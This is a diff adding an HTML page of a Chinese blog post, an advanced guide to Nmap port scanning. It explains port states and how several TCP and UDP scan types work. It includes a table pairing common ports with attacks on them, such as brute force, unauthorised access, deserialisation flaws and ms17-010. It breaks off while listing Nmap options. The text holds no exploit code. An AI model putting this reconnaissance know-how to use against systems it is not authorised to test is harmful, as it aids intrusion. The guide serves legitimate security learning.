@@ -1,0 +1,2094 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Red Team,Nmap,NSE,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文总结端口扫描中Nmap的一些进阶用法及实用技巧...">
+<meta name="keywords" content="Red Team,Nmap,NSE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="端口扫描之Nmap进阶指南">
+<meta property="og:url" content="https://l0n9.cc/posts/46803/index.html">
+<meta property="og:site_name" content="L0n9">
+<meta property="og:description" content="本文总结端口扫描中Nmap的一些进阶用法及实用技巧...">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/tcp_head.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_open.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_closed.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_open.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_closed.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_unfilteredpng.png">
+<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_filtered.png">
+<meta property="og:updated_time" content="2021-03-27T13:13:57.700Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="端口扫描之Nmap进阶指南">
+<meta name="twitter:description" content="本文总结端口扫描中Nmap的一些进阶用法及实用技巧...">
+<meta name="twitter:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/tcp_head.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://l0n9.cc/posts/46803/">
+
+
+
+
+
+  <title>端口扫描之Nmap进阶指南 | L0n9</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L0n9</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-攻防">
+          <a href="/security/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-navicon"></i> <br>
+            
+            攻防
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://l0n9.cc/posts/46803/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="L0n9">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/hexo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0n9">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">端口扫描之Nmap进阶指南</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-26T20:03:58+08:00">
+                2018-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/红队渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">红队渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <center>本文总结端口扫描中Nmap的一些进阶用法及实用技巧...</center>
+
+<a id="more"></a>
+
+<h3 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h3><p>端口扫描是指客户端向一定范围的服务器端口发送对应请求，以此确认可使用的端口；通过扫描结果可以知道服务器上都提供了哪些服务，以利用该服务的已知漏洞；企业外网端口监控，是预防攻击者从外部直接入侵的一道重要防线</p>
+<h4 id="1-端口状态"><a href="#1-端口状态" class="headerlink" title="1. 端口状态"></a>1. 端口状态</h4><p>以下为Nmap对端口状态的划分及说明</p>
+<table>
+<thead>
+<tr>
+<th>状态</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>open(开放的)</td>
+<td>应用程序正在该端口接收TCP连接或者UDP报文，有应用程序在监听这个端口，可以被访问</td>
+</tr>
+<tr>
+<td>closed(关闭的)</td>
+<td>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听</td>
+</tr>
+<tr>
+<td>filtered(被过滤的)</td>
+<td>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放</td>
+</tr>
+<tr>
+<td>unfiltered(未被过滤的)</td>
+<td>端口可访问，但Nmap无法准确判断端口是否开放，ACK扫描中出现</td>
+</tr>
+<tr>
+<td>open/filtered(开放或者被过滤的)</td>
+<td>无法确定端口是开放还是被过滤的，如开放的端口不响应；UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类</td>
+</tr>
+<tr>
+<td>closed/filtered(关闭或者被过滤的)</td>
+<td>用于Nmap不能确定端口是关闭的还是被过滤的，只可能出现在IPID Idle扫描中</td>
+</tr>
+</tbody></table>
+<h4 id="2-扫描方式"><a href="#2-扫描方式" class="headerlink" title="2. 扫描方式"></a>2. 扫描方式</h4><p><strong>TPC报文表头</strong></p>
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/tcp_head.png" alt></p>
+<p><em>Refer:</em> <a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wikipedia/Transmission_Control_Protocol</a></p>
+<h5 id="a-TCP-全连接扫描"><a href="#a-TCP-全连接扫描" class="headerlink" title="a. TCP 全连接扫描"></a>a. TCP 全连接扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP Connect扫描又称为全连接扫描，客户端与服务器建立 TCP 连接要进行一次三次握手，如果进行了一次成功的三次握手，则说明端口开放</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会发送带有ACK和RST标识的数据包给服务点，此时客户端与服务器建立了连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_open.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当客户端发送一个带有 SYN 标识和端口号的 TCP 数据包给服务器后，如果服务器端返回一个带 RST 标识的数据包，则说明端口处于关闭状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/1_closed.png" alt></p>
+<h5 id="b-TCP-SYN扫描"><a href="#b-TCP-SYN扫描" class="headerlink" title="b. TCP SYN扫描"></a>b. TCP SYN扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP SYN扫描又称半开式扫描，该过程不会和服务端建立完整的连接；SYN扫描是直接发RST，而TCP全连接扫描是发ACK和RST</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端会发送一个带有SYN标识和端口号的TCP数据包给服务器，如果服务器这个端口是开放的，则会接受这个连接并返回一个带有SYN和ACK标识的数据包给客户端，随后客户端会返回带有RST标识的数据包而不是返回一个带有ACK和RST标识的数据包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_open.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果目标端口处于关闭状态，则服务端会返回一个RST标识的数据包</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/2_closed.png" alt></p>
+<h5 id="c-TCP-ACK扫描"><a href="#c-TCP-ACK扫描" class="headerlink" title="c. TCP ACK扫描"></a>c. TCP ACK扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACK扫描返回两种状态: unfiltered/filtered；当发送给对方一个含有 ACK 表示的TCP报文的时候，都返回含有RST标志的报文，使用TCP ACK扫描来确定端口是否开放或者关闭；但可以利用它来扫描防火墙的配置，来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_unfilteredpng.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口不响应，或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的)；服务器REJECT掉数据包，客户端会有个ICMP包返回，如果是直接DROP掉，就会什么也不会返回</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/3_filtered.png" alt></p>
+<h5 id="d-TCP-Null扫描"><a href="#d-TCP-Null扫描" class="headerlink" title="d. TCP Null扫描"></a>d. TCP Null扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在空扫描中，客户端发出的 TCP 数据包仅仅只会包含端口号而不会有其他任何的标识信息。</span><br><span class="line"></span><br><span class="line">1）如果目标端口是开放的则不会回复任何信息</span><br><span class="line"></span><br><span class="line">2）如果服务器返回了一个 RST（或者RST+ACK) 数据包，则说明目标端口是关闭的</span><br><span class="line"></span><br><span class="line">3）如果返回 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明端口被服务器过滤了</span><br></pre></td></tr></table></figure>
+
+<h5 id="e-TCP-Window扫描"><a href="#e-TCP-Window扫描" class="headerlink" title="e. TCP Window扫描"></a>e. TCP Window扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TCP 窗口扫描的流程同 ACK 扫描类似，同样是客户端向服务器发送一个带有 ACK 标识和端口号的 TCP 数据包，这种扫描能够用于发现目标服务器端口的状态。在 ACK 扫描中返回 RST 表明没有被过滤，但在窗口扫描中，当收到返回的 RST 数据包后，它会检查窗口大小的值</span><br><span class="line"></span><br><span class="line">1) 如果窗口大小的值是个非零值，则说明目标端口是开放的</span><br><span class="line"></span><br><span class="line">2) 如果返回的 RST 数据包中的窗口大小为0，则说明目标端口是关闭的</span><br></pre></td></tr></table></figure>
+
+<h5 id="f-TCP-FIN扫描"><a href="#f-TCP-FIN扫描" class="headerlink" title="f. TCP FIN扫描"></a>f. TCP FIN扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FIN 扫描会向服务器发送带有 FIN 标识和端口号的 TCP 数据包。</span><br><span class="line"></span><br><span class="line">1）如果没有服务器端回应则说明端口开放</span><br><span class="line"></span><br><span class="line">2）如果服务器返回一个 RST 数据包，则说明目标端口是关闭的</span><br><span class="line"></span><br><span class="line">3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 代码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定端口状态</span><br></pre></td></tr></table></figure>
+
+<h5 id="g-TCP-Xmas扫描"><a href="#g-TCP-Xmas扫描" class="headerlink" title="g. TCP Xmas扫描"></a>g. TCP Xmas扫描</h5><p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在发送的数据包中设置PSH（PUSH推送，数据包立刻发送）,FIN（结束会话）,URG（紧急）标志位</span><br><span class="line"></span><br><span class="line">1）如果目标端口是开放的则不会回复任何信息</span><br><span class="line"></span><br><span class="line">2）如果目标端口关闭则会返回一个RST+ACK的数据包</span><br><span class="line"></span><br><span class="line">3）如果服务器返回了一个 ICMP 数据包，其中包含 ICMP 目标不可达错误类型3以及 ICMP 状态码为1，2，3，9，10或13，则说明目标端口被过滤了无法确定是否处于开放状态</span><br></pre></td></tr></table></figure>
+
+<h5 id="h-UDP扫描"><a href="#h-UDP扫描" class="headerlink" title="h. UDP扫描"></a>h. UDP扫描</h5><p><strong>TCP/UDP 对比</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TCP 是面向连接的协议，而UDP则是无连接的协议。</span><br><span class="line"></span><br><span class="line">面向连接的协议会先在客户端和服务器之间建立通信信道，然后才会开始传输数据。如果客户端和服务器之间没有建立通信信道，则不会有任何产生任何通信数据。</span><br><span class="line"></span><br><span class="line">无连接的协议则不会事先建立客户端和服务器之间的通信信道，只要客户端到服务器存在可用信道，就会假设目标是可达的然后向对方发送数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>扫描原理</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端会向服务器发送一个带有端口号的 UDP 数据包</span><br><span class="line"></span><br><span class="line">1）如果服务器回复了 UDP 数据包，则目标端口是开放的</span><br><span class="line"></span><br><span class="line">2）如果服务器返回了一个 ICMP 目标不可达的错误和代码3，则意味着目标端口处于关闭状态</span><br><span class="line"></span><br><span class="line">3）如果服务器返回一个 ICMP 错误类型3且代码为1，2，9，10或13的数据包，则说明目标端口被服务器过滤了</span><br><span class="line"></span><br><span class="line">4）如果服务器没有任何相应客户端的 UDP 请求，则可以断定目标端口可能是开放或被过滤的，无法判断端口的最终状态</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-端口渗透"><a href="#3-端口渗透" class="headerlink" title="3. 端口渗透"></a>3. 端口渗透</h4><p>总计一些常用端口的渗透用途</p>
+<table>
+<thead>
+<tr>
+<th align="center">端口</th>
+<th align="center">服务</th>
+<th align="center">渗透用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">21</td>
+<td align="center">ftp/tftp/vsftpd文件传输协议</td>
+<td align="center">爆破/嗅探/溢出/后门</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">ssh远程连接</td>
+<td align="center">爆破/OpenSSH漏洞</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td align="center">Telnet远程连接</td>
+<td align="center">爆破/嗅探</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td align="center">SMTP邮件服务</td>
+<td align="center">邮件伪造</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td align="center">DNS域名解析系统</td>
+<td align="center">DNS区域传输/劫持/缓存投毒/欺骗; 利用DNS隧道技术刺透防火墙</td>
+</tr>
+<tr>
+<td align="center">67/68</td>
+<td align="center">dhcp服务</td>
+<td align="center">劫持/欺骗</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td align="center">tftp(简单文件传输协议,无认证)</td>
+<td align="center">尝试下载目标重要配置文件</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td align="center">pop3</td>
+<td align="center">爆破/嗅探</td>
+</tr>
+<tr>
+<td align="center">137/139</td>
+<td align="center">Samba服务</td>
+<td align="center">爆破/未授权访问/远程代码执行</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td align="center">Imap协议</td>
+<td align="center">爆破</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td align="center">SNMP协议</td>
+<td align="center">爆破/搜集目标内网信息</td>
+</tr>
+<tr>
+<td align="center">389</td>
+<td align="center">Ldap目录访问协议</td>
+<td align="center">注入/未授权访问/弱口令/匿名访问</td>
+</tr>
+<tr>
+<td align="center">445</td>
+<td align="center">smb</td>
+<td align="center">ms17-010/端口溢出</td>
+</tr>
+<tr>
+<td align="center">512/513/514</td>
+<td align="center">Linux Rexec服务</td>
+<td align="center">爆破/Rlogin登陆</td>
+</tr>
+<tr>
+<td align="center">873</td>
+<td align="center">Rsync服务</td>
+<td align="center">文件上传/匿名访问</td>
+</tr>
+<tr>
+<td align="center">1080</td>
+<td align="center">socket</td>
+<td align="center">爆破/内网渗透</td>
+</tr>
+<tr>
+<td align="center">1099</td>
+<td align="center">JAVA RMI</td>
+<td align="center">反序列化远程命令执行漏洞</td>
+</tr>
+<tr>
+<td align="center">1194</td>
+<td align="center">openvpn</td>
+<td align="center">获取vpn账号,进内网</td>
+</tr>
+<tr>
+<td align="center">1352</td>
+<td align="center">Lotus domino邮件服务</td>
+<td align="center">爆破/弱口令/信息泄漏</td>
+</tr>
+<tr>
+<td align="center">1433</td>
+<td align="center">mssql</td>
+<td align="center">爆破/注入攻击/提权/sa弱口令</td>
+</tr>
+<tr>
+<td align="center">1500</td>
+<td align="center">ispmanager主机控制面板</td>
+<td align="center">弱口令</td>
+</tr>
+<tr>
+<td align="center">1521</td>
+<td align="center">oracle</td>
+<td align="center">注入攻击/TNS爆破/弹shell</td>
+</tr>
+<tr>
+<td align="center">1723</td>
+<td align="center">pptp</td>
+<td align="center">爆破/获取vpn账号,进内网</td>
+</tr>
+<tr>
+<td align="center">2049</td>
+<td align="center">Nfs服务</td>
+<td align="center">配置不当</td>
+</tr>
+<tr>
+<td align="center">2082,2083</td>
+<td align="center">cpanel主机管理面板登录</td>
+<td align="center">弱口令</td>
+</tr>
+<tr>
+<td align="center">2181</td>
+<td align="center">zookeeper服务</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">2375</td>
+<td align="center">docker remote api</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">2601,2604</td>
+<td align="center">zebra路由</td>
+<td align="center">默认密码zerbra</td>
+</tr>
+<tr>
+<td align="center">3128</td>
+<td align="center">squid代理服务</td>
+<td align="center">弱口令</td>
+</tr>
+<tr>
+<td align="center">3306</td>
+<td align="center">mysql</td>
+<td align="center">爆破/注入/拒绝服务/提取</td>
+</tr>
+<tr>
+<td align="center">3389</td>
+<td align="center">Rdp远程桌面连接</td>
+<td align="center">爆破/shift后门/ms12-020</td>
+</tr>
+<tr>
+<td align="center">3690</td>
+<td align="center">svn服务</td>
+<td align="center">svn泄露/未授权访问</td>
+</tr>
+<tr>
+<td align="center">4848</td>
+<td align="center">GlassFish控制台</td>
+<td align="center">爆破/认证绕过</td>
+</tr>
+<tr>
+<td align="center">5000</td>
+<td align="center">sybase/DB2数据库</td>
+<td align="center">爆破/注入</td>
+</tr>
+<tr>
+<td align="center">5432</td>
+<td align="center">postgresql</td>
+<td align="center">爆破/注入/缓冲区溢出</td>
+</tr>
+<tr>
+<td align="center">5632</td>
+<td align="center">pcanywhere服务</td>
+<td align="center">拒绝服务/代码执行</td>
+</tr>
+<tr>
+<td align="center">5900,5901,5902</td>
+<td align="center">vnc</td>
+<td align="center">弱口令爆破</td>
+</tr>
+<tr>
+<td align="center">5984</td>
+<td align="center">CouchDB</td>
+<td align="center">未授权访问导致任意指令执行</td>
+</tr>
+<tr>
+<td align="center">6379</td>
+<td align="center">Redis数据库</td>
+<td align="center">未授权访问/爆破</td>
+</tr>
+<tr>
+<td align="center">6443</td>
+<td align="center">Kubernetes API Server</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">7001/7002</td>
+<td align="center">weblogic</td>
+<td align="center">java反序列化/控制台弱口令/控制台上传webshell/SSRF</td>
+</tr>
+<tr>
+<td align="center">80-89,443</td>
+<td align="center">http/https</td>
+<td align="center">web应用漏洞/OpenSSL心脏滴血</td>
+</tr>
+<tr>
+<td align="center">8000</td>
+<td align="center">JDWP</td>
+<td align="center">远程命令执行漏洞</td>
+</tr>
+<tr>
+<td align="center">8069</td>
+<td align="center">zabbix服务</td>
+<td align="center">远程命令执行/注入</td>
+</tr>
+<tr>
+<td align="center">8080-8089</td>
+<td align="center">Jboss/Tomcat/Jenkins/Resin/Jetty</td>
+<td align="center">控制台弱口令/反序列化/远程文件读取</td>
+</tr>
+<tr>
+<td align="center">8083/8086</td>
+<td align="center">influxDB</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">8161</td>
+<td align="center">ActiveMQ</td>
+<td align="center">弱口令/任意文件写入/反序列化</td>
+</tr>
+<tr>
+<td align="center">9000</td>
+<td align="center">fastcgi</td>
+<td align="center">远程命令执行</td>
+</tr>
+<tr>
+<td align="center">9080-9081,9090</td>
+<td align="center">Websphere控制台</td>
+<td align="center">java反序列化/弱口令</td>
+</tr>
+<tr>
+<td align="center">9200/9300</td>
+<td align="center">elasticsearch</td>
+<td align="center">未授权访问/远程代码执行</td>
+</tr>
+<tr>
+<td align="center">11211</td>
+<td align="center">memcached</td>
+<td align="center">未授权访问</td>
+</tr>
+<tr>
+<td align="center">27017/27018</td>
+<td align="center">mongodb</td>
+<td align="center">未授权访问/爆破</td>
+</tr>
+<tr>
+<td align="center">50000</td>
+<td align="center">SAP</td>
+<td align="center">远程代码执行</td>
+</tr>
+<tr>
+<td align="center">50070,50030</td>
+<td align="center">hadoop</td>
+<td align="center">默认端口未授权访问</td>
+</tr>
+</tbody></table>
+<p><em>Refer:</em> <a href="http://www.91ri.org/15441.html" target="_blank" rel="noopener">http://www.91ri.org/15441.html</a></p>
+<h3 id="0x02-Nmap基础"><a href="#0x02-Nmap基础" class="headerlink" title="0x02 Nmap基础"></a>0x02 Nmap基础</h3><h4 id="1-参数总结"><a href="#1-参数总结" class="headerlink" title="1. 参数总结"></a>1. 参数总结</h4><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标选取</td>
+<td>-iL inputfilename (从列表中输入)<br><br> -iR hostnum (随机选择目标)<br><br> –exclude &lt;host1[，host2][，host3]，…&gt; (排除主机/网络) <br><br> –excludefile excludefile (排除文件中的列表)</td>
+<td>指定目标范围</td>
+</tr>
+<tr>
+<td>主机发现</td>
+<td>a. -sL (列表扫描) <br><br> b. -sP (Ping扫描) <br><br> c. -P0 (无ping) <br><br> d. -PS [portlist] (TCP SYN Ping) <br><br> e. -PA [portlist] (TCP ACK Ping)<br><br> f. -PU [portlist] (UDP Ping)<br><br> g. -PE; -PP; -PM (ICMP Ping Types) <br><br> h. -PR (ARP Ping)<br><br> i. -n (不用域名解析) <br><br> j. -R (为所有目标解析域名)<br><br>k. –system-dns (使用系统域名解析器)</td>
